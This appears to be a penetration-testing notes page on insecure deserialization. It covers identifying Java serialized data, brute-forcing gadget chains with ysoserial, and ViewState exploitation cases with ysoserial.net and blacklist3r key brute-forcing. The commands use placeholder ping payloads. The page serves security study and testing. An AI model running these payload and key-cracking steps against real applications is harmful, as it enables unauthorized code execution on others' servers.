---
description: Insecure Deserialization Vulnerabilities
---

# Insecure Deserialization

> Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

### Java Deserialization

#### Identifying serialized data

Look for Java serialized data being sent to the server. Java binary serialized data starts with hex bytes "ac ed 00 05":

<figure><img src="../../.gitbook/assets/javadeser1 (1).png" alt=""><figcaption><p>HEX bytes of a Java serialized data</p></figcaption></figure>

In web applications, it might be encoded to base64. Look for b64 data starting with "rO0AB":

<figure><img src="../../.gitbook/assets/javadeser2.png" alt=""><figcaption><p>Base64 encoding of "ac ed 00 05".</p></figcaption></figure>

#### Exploiting

When approaching an application that utilizes serialized Java data, we do not know the libraries used by the backed. This is necessary for the exploitation. In that case, a brute-force approach might be rewarding (with all the payloads on [ysoserial](https://github.com/frohoff/ysoserial)):

{% code overflow="wrap" %}
```
while read payloadname; do java -jar /opt/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname "ping x.x.x.x -c 3" > $payloadname; done < payloads.txt 
```
{% endcode %}

If we already know the library being used, we can generate a payload like this:

```bash
java -jar ysoserial.jar CommonsCollections1 '<COMMAND_HERE>'
```

**Note:** Command parameters being passed as payload can not contain spaces.

#### URLDNS

Instead of providing RCE payloads directly, we can use the URLDNS payload to make the deserialization endpoint to resolve an arbitrary DNS name. It uses built-in Java features, so it is most likely to work almost in every case:

<figure><img src="../../.gitbook/assets/javadeser3.png" alt=""><figcaption><p>URLDNS Example</p></figcaption></figure>

#### Common errors

If we receive an Stacktrace while exploiting insecure deserialization, this might indicate:&#x20;

* **ClassNotFoundException:** Target application does not use the gadget library (payload) used. Try others.
* **Java.io.IOException with message "Cannot run program":** Payload worked, but the application is unavailable.&#x20;

#### References

* [Ysoserial](https://github.com/frohoff/ysoserial)&#x20;
* [Burp plugin – Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) &#x20;
* [Burp plugin – Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae) [(Tutorial)](https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/)&#x20;
* [Java Deserialization Cheatsheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)&#x20;
* [Java Deserialization Exploits](https://github.com/Coalfire-Research/java-deserialization-exploits)&#x20;
* [Java Deserialization tips](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md)&#x20;

### .NET Deserialization

.NET serialization use the following methods:&#x20;

* BinaryFormatter&#x20;
* DataContractSerializer&#x20;
* NetDataContractSerializer&#x20;
* XML Serialization&#x20;

Each of these methods result in a different format of a serialized object (binary, XML..)&#x20;

#### ViewState

ViewState is a serialized data used to persist the state of a page. It is deserialized when sent to the server. The later the .NET version, the more difficult is to tamper with ViewState.&#x20;

The table below lists the possible scenarios for exploiting ViewState Deserialization flaws:

<figure><img src="../../.gitbook/assets/net.png" alt=""><figcaption><p>ViewState deserialization flaws</p></figcaption></figure>

#### Case 1. ViewState has MAC disabled (rare)

If this is the case, we can freely execute code using ysoserial.net:

{% code overflow="wrap" %}
```powershell
C:\> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping x.x.x.x"
```
{% endcode %}

**Note:** Developers can remove the ViewState parameter from the requests (hide it). If we generate a payload and insert it as a parameter, we might gain RCE.

#### Case 2. ViewState has MAC enabled and not encrypted

In this case, we can execute code only if the MachineKey is hardcoded (in web.config) and we find a way to access it. Also, we can brute-force it with a list of keys using [blacklist3r](https://github.com/NotSoSecure/Blacklist3r):

{% code overflow="wrap" %}
```
C:\ > AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDWUkltkY... --purpose=viewstate --modifier=ca0b0334 --macdecode
```
{% endcode %}

* **--encrypteddata:** \_\_VIEWSTATE parameter value of the target application.
* **--modifier:** \_\_VIEWSTATEGENERATOR parameter value.

#### Case 3. ViewState has MAC enabled/disabled and encrypted

In this case, we might (not 100%) execute code by leaking the MachineKey and removing the "\_\_VIEWSTATEENCRYPTED" parameter from the request.

#### Case 4. ViewState has MAC enabled/disabled and not/is encrypted (but not both false) and –NET >= 4.5

In this case, we might execute code. Refer to this [manual](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net) for more details.&#x20;

#### References

[Exploiting ViewState using blacklist3r and ysoserial.net](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)&#x20;

[Deep Dive into .NET ViewState deserialization and its exploitation](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)&#x20;

[Finding and Exploiting .NET Remoting over HTTP using Deserialisation](https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/)&#x20;
